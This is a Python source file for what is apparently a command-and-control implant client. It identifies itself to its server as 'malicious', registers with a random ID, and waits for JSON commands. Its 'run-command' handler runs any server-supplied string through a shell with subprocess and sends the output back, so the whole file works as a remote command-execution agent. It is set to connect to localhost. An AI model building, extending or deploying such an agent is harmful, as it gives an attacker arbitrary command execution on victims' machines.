import socket
import math
import logging
import time
import random
import string
import subprocess
import json

logging.basicConfig(level=logging.DEBUG)
logging.basicConfig(filename='client.log', filemode='a', format='%(name)s - %(levelname)s - %(message)s', force=True)
class MClient:

    def __init__(self, ip="127.0.0.1", port=80):
        self.ip = ip
        self.port = port
        self.heartbeat = 60
        self.connected_socket = socket

    def run(self):
        pass
        self.client_id = MClient.generate_client_id()

        while True:
            #connect to server
            self.connected_socket = MClient.connect_to_server(ip=self.ip, port=self.port)
            #send ID
            self.send_identification_to_server(conn=self.connected_socket)
            # recieve MSG
            msg_from_server = self.recieve_msg(conn=self.connected_socket)
            #print(msg_from_server)
            logging.debug(f"[MClient Python (run)] Message From server: {msg_from_server}")

            ## if there's a json exception/error...
            converted_msg_from_server = self.json_convert(msg_from_server)
            if not converted_msg_from_server:
                continue

            ## pass parsed msg to the decision tree
            client_results = self.decision_tree(
                command = converted_msg_from_server["Main"]["msg"]["msg_content"]["command"],
                value = converted_msg_from_server["Main"]["msg"]["msg_content"]["command_value"]
            )

            ## convert back to JSON
            ## and send that object
            self.send_msg(client_results, self.connected_socket)
            # disconnect
            #time.sleep(heartbeat)
            ## simple as that


    @staticmethod
    def connect_to_server(ip="127.0.0.1", port=0) -> socket:
        connection_to_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_addr = (ip, int(port))

        try:
            connection_to_server.connect(server_addr)
        except ConnectionRefusedError:
            logging.debug("Connection Refused")
        except Exception as e:
            logging.debug(f"Unknown Error: {e}")

        return connection_to_server

    def send_identification_to_server(self, conn=socket):
        """ Sends client id to server, the loop catches the response & handles it

            Note, the previous comments said that the header does not need to be sent, however
            that was fixed, and everything *should* be using WIWP for communication
        """
        #conn.send(self.str_encode(f"!_client_!\\|/{self.client_id}\\|/{self.client_id}"))
        self.send_msg(self.json_format(client_id=self.client_id, action="!_clientlogin_!", msg_to="server"),
                      conn=self.connected_socket)

    def decision_tree(self, command="", command_value=""):
        print(f"command from server: {command}")
        if command.lower() == "session":
            while True:
                session_command = self.recieve_msg(self.connected_socket)
                if session_command.lower() == "break":
                    return "session breaking"
                    break
                else:
                    session_command_results = self.decision_tree(command=session_command)
                    return session_command_results
                    #self.send_msg(session_command_results)

        elif command == "" or command.lower() == "help":
            help_command = "Python Agent Help Menu:\n\n" \
            "help: Shows the help data\n" \
            "\n[System]\n" \
            "run-command COMMAND: Runs a command on the system. Platform agnostic\n"

            return help_command

        elif "run-command" in command.lower():
            system_command = command_value #command.replace("run-command","") old way of doing it
            return System.run_command(system_command)

    @staticmethod
    def generate_client_id():
        client_id = ""
        for i in range(0, 5):
            client_id += random.choice(string.ascii_uppercase)

        return client_id

    def send_msg(self, msg="NoMSG", conn=socket):
        ## clients need to have a shared known header beforehand. Default is 10
        HEADER_BYTES = 10
        BUFFER = 1024

        ## get the length of the message in bytes
        msg_length = len(msg)

        ## create a header for the message that includes the length of the message
        header = self.str_encode(str(msg_length).zfill(HEADER_BYTES))  # .encode()
        ## send the header followed by the message in chunks
        logging.debug(f"[FriendlyClient (send_msg)] SENDING HEADER: {header}")
        conn.send(header)

        for i in range(0, math.ceil(msg_length / BUFFER)):
            ## gets the right spot in the message in a loop
            chunk = msg[i * BUFFER:(i + 1) * BUFFER]
            logging.debug(f"[FriendlyClient (send_msg)] SENDING CHUNK: {chunk}")
            conn.send(self.str_encode(chunk))
            # visual_bar += "="
            # self.shellformat(visual_bar)
            ## test delay
            time.sleep(0.01)

        #recv_msg = self.recieve_msg(self.server)
        #return recv_msg

    def recieve_msg(self, conn=socket):
        complete_msg = ""
        ## clients need to have a shared known header beforehand. Default is 10
        HEADER_BYTES = 10
        BUFFER = 1024
        header_value = 0
        header_contents = ""

        msg_bytes_recieved_so_far = 0

        header_msg_length = conn.recv(HEADER_BYTES).decode()  # int(bytes_decode(msg)
        print(f"header msg length: {header_msg_length}")
        # print("HEADER:" + header_msg_length)
        logging.debug(f"[FriendlyClient (recieve_msg)] HEADER: {header_msg_length}")

        ## getting the amount of chunks/iterations eneded at 1024 bytes a message
        chunks = math.ceil(int(header_msg_length) / BUFFER)

        complete_msg = ""


        # while True:
        for i in range(0, chunks):
            # i + 1 as i starts at 0
            logging.debug(f"[FriendlyClient (recieve_msg)] RECEVING CHUNK {i + 1}/{chunks}")
            msg = conn.recv(BUFFER)  # << adjustble, how many bytes you want to get per iteration
            msg_bytes_recieved_so_far = msg_bytes_recieved_so_far + len(self.bytes_decode(msg))

            complete_msg += self.bytes_decode(msg)

        return complete_msg

    def bytes_decode(self, input) -> str:
        decoded_result = input.decode()
        return decoded_result

    ## str -> bytes
    def str_encode(self, input) -> bytes:
        encoded_result = input.encode()
        return encoded_result

    def json_format(self, action="", msg_content="", msg_to="", client_id=""):
        '''
        JSON formatter for sending messages to the server

        Returns a json object

        '''

        ## Quick parse on the command - grabs the command via strip, then replaces it with "" for the value
        try:
            cmd = msg_content.split()[0]
            cmd_value = msg_content.replace(cmd, "")
        except Exception as e:
            logging.debug(f"[Server (JSON format)] error with parsing command {msg_content}: {e}")
            cmd = msg_content
            cmd_value = "empty"
        ## Expanded our here for readability
        user_msg_to_be_sent = {
            "Main": {
                "general": {
                    "action": action,
                    "client_id": client_id,
                    "client_type": "malicious",
                    "password": "empty"
                },
                "conn": {
                    "client_ip": self.ip,
                    "client_port": self.port
                },
                "msg": {
                    "msg_to": msg_to,
                    "msg_content": {
                        "command": cmd,
                        "value": cmd_value
                    },
                    "msg_length": 1234,
                    "msg_hash": "hash of message (later)"
                },
                "stats": {
                    "latest_checkin": "time.now",
                    "device_hostname": "hostname",
                    "device_username": "username"
                },
                "security": {
                    "client_hash": "hash of client (later)",
                    "server_hash": "hash of server (later)"
                }
            }
        }

        return json.dumps(user_msg_to_be_sent)

    def json_convert(self, json_string=""):
        """
        Converts received msg from JSON to a python dict
        returns said dict
        """
        json_object = None
        ## Sanity check to make sure JSON is actually JSON b4 passing into validator
        try:
            # Python Obj             #raw JSON
            json_object = json.loads(json_string)
            return json_object

        except json.JSONDecodeError as e:
            print(f"JSON data is not valid. Error message: {e}")
            return False

        except Exception as e:
            print(f"error with JSON: {e}")
            return False


class System:
    @staticmethod
    def run_command(command):
        try:
            output = subprocess.check_output(
                command, stderr=subprocess.STDOUT, shell=True, timeout=3,
                universal_newlines=True)
            return output
        except subprocess.CalledProcessError as exc:
            return f"{exc.returncode, exc.output}"
        except Exception as e:
            return f"[CompilationWrapper(GCC: compile)] Unknown Error when compiling: {e}"

#client = MClient(ip="IPADDRESS",port=PORT)

client = MClient(ip="127.0.0.1",port=6060)
client.run()